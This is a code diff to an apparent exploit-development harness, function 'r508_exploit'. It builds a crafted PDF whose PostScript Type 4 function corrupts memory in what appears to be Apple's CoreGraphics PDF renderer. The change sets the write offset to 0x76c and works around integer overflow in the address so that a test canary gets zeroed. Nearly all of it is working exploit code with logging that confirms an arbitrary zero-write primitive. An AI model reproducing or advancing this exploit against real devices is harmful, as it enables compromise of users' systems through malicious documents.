@@ -31346,7 +31346,6 @@ static void r508_exploit(void) {
     static volatile uint32_t r508_canary = 0xCAFEBABE;
     uint64_t canary_addr = (uint64_t)(uintptr_t)&r508_canary;
     rlog("  canary at %p = 0x%08x\n", (void *)&r508_canary, r508_canary);
-    rlog("  Will test both offset 0xc (gen_zero_write.py) and 0x1c (observed on device)\n");
 
     /* --- Phase 7A: Baseline — NOUT=2816 VPR=64 DeviceCMYK with uniform 1.0 (Type 2) ---
        Compare FAR with Phase 5 (R=136 VPR=2 DeviceGray → FAR=0x3FF000000000001c).
@@ -31571,19 +31570,20 @@ static void r508_exploit(void) {
     }
 
     /* --- Phase 7C: Canary test ---
-       Use whichever method works from 7A/7B results. */
-    rlog("\n  7C: Canary targeting at %p (using Type 4 calc with canary addr)\n",
-        (void *)&r508_canary);
-
-    uint64_t offsets_to_try[] = { 0xc, 0x1c };
-    for (int oi = 0; oi < 2 && r508_canary == 0xCAFEBABE; oi++) {
-        uint64_t off = offsets_to_try[oi];
-        uint64_t x22_target = canary_addr - off;
+       7A showed offset is 0x76c for NOUT=2816 VPR=64 DeviceCMYK geometry.
+       7B confirmed Type 4 calculator works (FAR = 42 + 0x76c).
+       7C fix: use offset 0x76c AND format mantissa as real (%.1f) to avoid
+       int32 overflow in PostScript parser for addresses > 2^31. */
+    {
+        uint64_t str_offset = 0x76c;
+        uint64_t x22_target = canary_addr - str_offset;
         r508_canary = 0xCAFEBABE;
 
-        rlog("  7C[%d]: offset=0x%llx, x22=0x%llx, mantissa=%llu\n", oi,
-            (unsigned long long)off, (unsigned long long)x22_target,
-            (unsigned long long)x22_target);
+        rlog("\n  7C: Canary targeting with offset 0x76c (confirmed from 7A/7B)\n");
+        rlog("  canary=0x%08x at %p, x22_target=0x%llx (canary - 0x%llx)\n",
+            r508_canary, (void *)&r508_canary,
+            (unsigned long long)x22_target, (unsigned long long)str_offset);
+        rlog("  mantissa=%.1f (as real to avoid int32 overflow)\n", (double)x22_target);
 
         r508_fault_caught = 0;
         r508_fault_addr = 0;
@@ -31606,9 +31606,12 @@ static void r508_exploit(void) {
             }
             if (vb > 0) vo++;
 
+            /* Use %.1f to format mantissa as a REAL literal (has decimal point).
+               This prevents int32 overflow for addresses > 2^31.
+               PostScript reals are doubles, so exact for values < 2^53. */
             char *fbody = (char *)malloc(128 + (size_t)NOUT * 4);
-            int fbl = snprintf(fbody, 128, "{ pop %llu 2 -1074 exp mul",
-                (unsigned long long)x22_target);
+            int fbl = snprintf(fbody, 128, "{ pop %.1f 2 -1074 exp mul",
+                (double)x22_target);
             for (int d = 0; d < NOUT - 1; d++) {
                 memcpy(fbody + fbl, " dup", 4); fbl += 4;
             }
@@ -31655,6 +31658,8 @@ static void r508_exploit(void) {
                 "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
                 o1, o2, o3, o4, o5, o6, xo);
 
+            rlog("  PDF: %d bytes, func body first 80 chars: %.80s\n", pl, fbody);
+
             CFDataRef pd7 = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)p7, (CFIndex)pl);
             CGDataProviderRef dp7 = CGDataProviderCreateWithCFData(pd7);
             CGPDFDocumentRef dc7 = CGPDFDocumentCreateWithProvider(dp7);
@@ -31666,14 +31671,14 @@ static void r508_exploit(void) {
                     CGContextRef cx7 = CGBitmapContextCreate(px7, 64, 64, 8, 64*4, cs7,
                         (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
                     CGContextDrawPDFPage(cx7, pg7);
-                    rlog("  7C[%d] SURVIVED! canary=0x%08x (was 0xCAFEBABE)\n",
-                        oi, r508_canary);
+                    rlog("  7C SURVIVED! canary=0x%08x (was 0xCAFEBABE)\n", r508_canary);
                     if (r508_canary == 0x00000000) {
-                        rlog("  *** CANARY ZEROED! Zero-write primitive CONFIRMED! ***\n");
+                        rlog("  *** CANARY ZEROED! Arbitrary zero-write CONFIRMED! ***\n");
+                        rlog("  *** Offset 0x76c with NOUT=2816 VPR=64 DeviceCMYK ***\n");
                     } else if (r508_canary != 0xCAFEBABE) {
                         rlog("  *** CANARY CHANGED to 0x%08x! ***\n", r508_canary);
                     } else {
-                        rlog("  Canary unchanged\n");
+                        rlog("  Canary unchanged — str didn't reach canary\n");
                     }
                     CGContextRelease(cx7); CGColorSpaceRelease(cs7); free(px7);
                 }
@@ -31682,8 +31687,14 @@ static void r508_exploit(void) {
             CGDataProviderRelease(dp7); CFRelease(pd7);
             free(p7); free(fbody); free(rpairs); free(vstream);
         } else {
-            rlog("  7C[%d] CRASH: FAR=0x%016llx (canary=0x%08x)\n",
-                oi, (unsigned long long)r508_fault_addr, r508_canary);
+            rlog("  7C CRASH: FAR=0x%016llx (canary=0x%08x)\n",
+                (unsigned long long)r508_fault_addr, r508_canary);
+            uint64_t expected = canary_addr;
+            if (r508_fault_addr == expected)
+                rlog("  FAR = canary addr exactly — str hit our target!\n");
+            else
+                rlog("  expected FAR=0x%016llx (canary_addr)\n",
+                    (unsigned long long)expected);
         }
         sigaction(SIGSEGV, &sa_old_segv, NULL);
         sigaction(SIGBUS, &sa_old_bus, NULL);
